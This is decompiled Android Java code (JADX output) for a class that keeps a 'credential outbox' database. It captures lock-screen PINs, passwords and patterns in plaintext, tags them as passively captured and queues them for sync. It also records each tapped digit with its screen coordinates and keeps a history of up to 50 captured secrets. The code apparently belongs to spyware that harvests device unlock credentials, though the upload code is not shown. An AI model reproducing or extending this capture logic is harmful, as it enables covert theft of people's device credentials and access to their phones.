// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.UUID;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class y2 extends SQLiteOpenHelper {

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public static final Object f5573d = new Object();

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static y2 f5574e;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final Context f5575c;

    public y2(Context context) {
        super(context, "lock_credential_outbox.db", (SQLiteDatabase.CursorFactory) null, 2);
        this.f5575c = context;
    }

    public static y2 y(Context context) {
        y2 y2Var;
        synchronized (f5573d) {
            try {
                if (f5574e == null) {
                    y2 y2Var2 = new y2(context.getApplicationContext());
                    f5574e = y2Var2;
                    y2Var2.G();
                }
                y2Var = f5574e;
            } catch (Throwable th) {
                throw th;
            }
        }
        return y2Var;
    }

    public final String A(long j3, String str, String str2, String str3) {
        if (str == null || str.isEmpty() || !("pin".equals(str2) || "password".equals(str2) || "pattern".equals(str2))) {
            return null;
        }
        if (j3 <= 0) {
            j3 = System.currentTimeMillis();
        }
        String string = UUID.randomUUID().toString();
        ContentValues contentValues = new ContentValues();
        contentValues.put("id", string);
        contentValues.put("secret", str);
        contentValues.put("mode", str2);
        contentValues.put("provenance", str3);
        contentValues.put("captured_at_ms", Long.valueOf(j3));
        contentValues.put("sync_state", (Integer) 0);
        getWritableDatabase().insertWithOnConflict("commitments", null, contentValues, 5);
        return string;
    }

    public final w2 B() {
        Cursor cursorQuery = getReadableDatabase().query("commitments", new String[]{"id", "secret", "mode", "provenance", "captured_at_ms", "sync_state", "rejection_reason"}, "sync_state!=?", new String[]{String.valueOf(2)}, null, null, "captured_at_ms DESC", "1");
        try {
            if (!cursorQuery.moveToFirst()) {
                cursorQuery.close();
                return null;
            }
            String string = cursorQuery.getString(0);
            String string2 = cursorQuery.getString(1);
            String string3 = cursorQuery.getString(2);
            String string4 = cursorQuery.getString(3);
            long j3 = cursorQuery.getLong(4);
            cursorQuery.getInt(5);
            cursorQuery.getString(6);
            w2 w2Var = new w2(j3, string, string2, string3, string4);
            cursorQuery.close();
            return w2Var;
        } catch (Throwable th) {
            if (cursorQuery == null) {
                throw th;
            }
            try {
                cursorQuery.close();
                throw th;
            } catch (Throwable th2) {
                th.addSuppressed(th2);
                throw th;
            }
        }
    }

    public final ArrayList C(String str) {
        ArrayList arrayList = new ArrayList();
        if (str.isEmpty()) {
            return arrayList;
        }
        Cursor cursorQuery = getReadableDatabase().query("digit_observations", new String[]{"digit"}, "session_key=? AND length(digit)=1", new String[]{str}, null, null, "id ASC", String.valueOf(32));
        while (cursorQuery.moveToNext()) {
            try {
                arrayList.add(cursorQuery.getString(0));
            } catch (Throwable th) {
                if (cursorQuery == null) {
                    throw th;
                }
                try {
                    cursorQuery.close();
                    throw th;
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                    throw th;
                }
            }
        }
        cursorQuery.close();
        return arrayList;
    }

    public final ArrayList D() {
        ArrayList arrayList = new ArrayList();
        Cursor cursorQuery = getReadableDatabase().query("commitments", new String[]{"id", "secret", "mode", "provenance", "captured_at_ms", "sync_state", "rejection_reason"}, "sync_state=?", new String[]{String.valueOf(0)}, null, null, "captured_at_ms ASC", String.valueOf(20));
        while (cursorQuery.moveToNext()) {
            try {
                String string = cursorQuery.getString(0);
                String string2 = cursorQuery.getString(1);
                String string3 = cursorQuery.getString(2);
                String string4 = cursorQuery.getString(3);
                long j3 = cursorQuery.getLong(4);
                cursorQuery.getInt(5);
                cursorQuery.getString(6);
                arrayList.add(new w2(j3, string, string2, string3, string4));
            } catch (Throwable th) {
                if (cursorQuery == null) {
                    throw th;
                }
                try {
                    cursorQuery.close();
                    throw th;
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                    throw th;
                }
            }
        }
        cursorQuery.close();
        return arrayList;
    }

    public final void E(ArrayList arrayList) {
        if (arrayList.isEmpty()) {
            return;
        }
        SQLiteDatabase writableDatabase = getWritableDatabase();
        writableDatabase.beginTransaction();
        try {
            ContentValues contentValues = new ContentValues();
            contentValues.put("sync_state", (Integer) 1);
            int size = arrayList.size();
            int i3 = 0;
            while (i3 < size) {
                Object obj = arrayList.get(i3);
                i3++;
                String str = (String) obj;
                if (str != null && !str.isEmpty()) {
                    writableDatabase.update("commitments", contentValues, "id=? AND sync_state=?", new String[]{str, String.valueOf(0)});
                }
            }
            writableDatabase.setTransactionSuccessful();
        } finally {
            writableDatabase.endTransaction();
        }
    }

    public final void F(String str, List list) {
        if (list == null || list.isEmpty()) {
            return;
        }
        String strTrim = str == null ? "" : str.trim();
        if (!strTrim.matches("[a-z0-9_]{1,64}")) {
            strTrim = "permanent_nack";
        }
        SQLiteDatabase writableDatabase = getWritableDatabase();
        writableDatabase.beginTransaction();
        try {
            ContentValues contentValues = new ContentValues();
            contentValues.put("sync_state", (Integer) 3);
            contentValues.put("rejection_reason", strTrim);
            Iterator it = list.iterator();
            while (it.hasNext()) {
                String str2 = (String) it.next();
                if (str2 != null && !str2.isEmpty()) {
                    writableDatabase.update("commitments", contentValues, "id=? AND sync_state=?", new String[]{str2, String.valueOf(0)});
                }
            }
            writableDatabase.setTransactionSuccessful();
        } finally {
            writableDatabase.endTransaction();
        }
    }

    /* JADX WARN: Code duplicated, block: B:40:0x00a7  */
    /* JADX WARN: Code duplicated, block: B:42:0x00b1  */
    /* JADX WARN: Code duplicated, block: B:44:0x00b8  */
    /* JADX WARN: Code duplicated, block: B:46:0x00c5  */
    public final void G() {
        String str;
        String string;
        String string2;
        int i3;
        JSONArray jSONArray;
        y2 y2Var = this;
        boolean z2 = false;
        SharedPreferences sharedPreferences = y2Var.f5575c.getSharedPreferences("captured_pin", 0);
        if (sharedPreferences.getBoolean("outbox_migrated_v1", false)) {
            return;
        }
        long jCurrentTimeMillis = System.currentTimeMillis();
        String string3 = sharedPreferences.getString("password_history", "");
        int i4 = 4;
        String str2 = "password";
        if (string3 == null || string3.length() <= 2) {
            str = "password";
        } else {
            try {
                JSONArray jSONArray2 = new JSONArray(string3);
                int i5 = 0;
                boolean z3 = false;
                while (i5 < jSONArray2.length()) {
                    try {
                        JSONObject jSONObject = jSONArray2.getJSONObject(i5);
                        String strOptString = jSONObject.optString("p", "");
                        String strOptString2 = jSONObject.optString("m", str2);
                        long jOptLong = jSONObject.optLong("t", jCurrentTimeMillis);
                        if (strOptString.length() < i4) {
                            str = str2;
                            jSONArray = jSONArray2;
                        } else {
                            if (!"pin".equals(strOptString2) && !str2.equals(strOptString2) && !"pattern".equals(strOptString2)) {
                                strOptString2 = str2;
                            }
                            str = str2;
                            jSONArray = jSONArray2;
                            try {
                                if (y2Var.A(jOptLong, strOptString, strOptString2, "passive") != null) {
                                    z3 = true;
                                }
                            } catch (Throwable th) {
                                th = th;
                                z2 = z3;
                                a0.a.p(th, new StringBuilder("history migrate fail: "), "CredOutbox");
                                if (!z2) {
                                    string = sharedPreferences.getString(str, "");
                                    string2 = sharedPreferences.getString("pin", "");
                                    if (string != null) {
                                        i3 = 4;
                                        if (string.length() >= 4) {
                                            A(jCurrentTimeMillis, string, "password", "passive");
                                        }
                                    } else {
                                        i3 = 4;
                                    }
                                    if (string2 != null) {
                                        A(jCurrentTimeMillis, string2, "pin", "passive");
                                    }
                                }
                                sharedPreferences.edit().putBoolean("outbox_migrated_v1", true).apply();
                                Log.i("CredOutbox", "prefs migration complete");
                            }
                        }
                        i5++;
                        y2Var = this;
                        jSONArray2 = jSONArray;
                        str2 = str;
                        i4 = 4;
                    } catch (Throwable th2) {
                        th = th2;
                        str = str2;
                    }
                }
                str = str2;
                z2 = z3;
            } catch (Throwable th3) {
                th = th3;
                str = "password";
            }
        }
        if (!z2) {
            string = sharedPreferences.getString(str, "");
            string2 = sharedPreferences.getString("pin", "");
            if (string != null) {
                i3 = 4;
                if (string.length() >= 4) {
                    A(jCurrentTimeMillis, string, "password", "passive");
                }
            } else {
                i3 = 4;
            }
            if (string2 != null && string2.length() >= i3) {
                A(jCurrentTimeMillis, string2, "pin", "passive");
            }
        }
        sharedPreferences.edit().putBoolean("outbox_migrated_v1", true).apply();
        Log.i("CredOutbox", "prefs migration complete");
    }

    public final void d() {
        SQLiteDatabase writableDatabase = getWritableDatabase();
        writableDatabase.beginTransaction();
        try {
            ContentValues contentValues = new ContentValues();
            contentValues.put("sync_state", (Integer) 2);
            writableDatabase.update("commitments", contentValues, "sync_state=?", new String[]{String.valueOf(0)});
            writableDatabase.delete("commitments", null, null);
            writableDatabase.delete("digit_observations", null, null);
            writableDatabase.setTransactionSuccessful();
            writableDatabase.endTransaction();
            this.f5575c.getSharedPreferences("captured_pin", 0).edit().remove("pin").remove("password").remove("password_history").apply();
            Log.i("CredOutbox", "cleared all commitments and projection");
        } catch (Throwable th) {
            writableDatabase.endTransaction();
            throw th;
        }
    }

    @Override // android.database.sqlite.SQLiteOpenHelper
    public final void onCreate(SQLiteDatabase sQLiteDatabase) {
        sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS commitments (id TEXT PRIMARY KEY NOT NULL,secret TEXT NOT NULL,mode TEXT NOT NULL,provenance TEXT NOT NULL,captured_at_ms INTEGER NOT NULL,sync_state INTEGER NOT NULL DEFAULT 0,rejection_reason TEXT NOT NULL DEFAULT '')");
        sQLiteDatabase.execSQL("CREATE INDEX IF NOT EXISTS commitments_pending_idx ON commitments (sync_state, captured_at_ms)");
        sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS digit_observations (id INTEGER PRIMARY KEY AUTOINCREMENT,session_key TEXT,digit TEXT NOT NULL,x REAL,y REAL,captured_at_ms INTEGER NOT NULL)");
    }

    @Override // android.database.sqlite.SQLiteOpenHelper
    public final void onUpgrade(SQLiteDatabase sQLiteDatabase, int i3, int i4) {
        if (i3 < 2) {
            sQLiteDatabase.execSQL("ALTER TABLE commitments ADD COLUMN rejection_reason TEXT NOT NULL DEFAULT ''");
        }
        if (i4 > 2) {
            throw new SQLiteException(a0.a.g("unsupported credential outbox version ", i4));
        }
    }

    public final void w(long j3, String str, String str2, String str3) {
        String strA = A(j3, str, str2, str3);
        if (strA == null) {
            return;
        }
        if (j3 <= 0) {
            j3 = System.currentTimeMillis();
        }
        String str4 = "[]";
        Context context = this.f5575c;
        SharedPreferences sharedPreferences = context.getSharedPreferences("captured_pin", 0);
        try {
            String string = sharedPreferences.getString("password_history", "[]");
            if (string != null && !string.isEmpty()) {
                str4 = string;
            }
            JSONArray jSONArray = new JSONArray(str4);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("p", str);
            jSONObject.put("t", j3);
            jSONObject.put("m", str2);
            jSONArray.put(jSONObject);
            while (jSONArray.length() > 50) {
                jSONArray.remove(0);
            }
            sharedPreferences.edit().putString("password_history", jSONArray.toString()).apply();
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("history append fail: "), "CredOutbox");
        }
        SharedPreferences.Editor editorEdit = context.getSharedPreferences("captured_pin", 0).edit();
        if ("password".equals(str2)) {
            editorEdit.putString("password", str);
        } else if ("pin".equals(str2)) {
            editorEdit.putString("pin", str);
        }
        editorEdit.apply();
        Log.i("CredOutbox", "commitment enqueued id=" + strA + " mode=" + str2 + " provenance=" + str3 + " len=" + str.length());
    }

    public final void z(String str, String str2, float f3, float f4, long j3) {
        if (str2 == null || str2.isEmpty()) {
            return;
        }
        ContentValues contentValues = new ContentValues();
        if (str == null) {
            str = "";
        }
        contentValues.put("session_key", str);
        contentValues.put("digit", str2);
        contentValues.put("x", Float.valueOf(f3));
        contentValues.put("y", Float.valueOf(f4));
        if (j3 <= 0) {
            j3 = System.currentTimeMillis();
        }
        contentValues.put("captured_at_ms", Long.valueOf(j3));
        getWritableDatabase().insert("digit_observations", null, contentValues);
    }
}
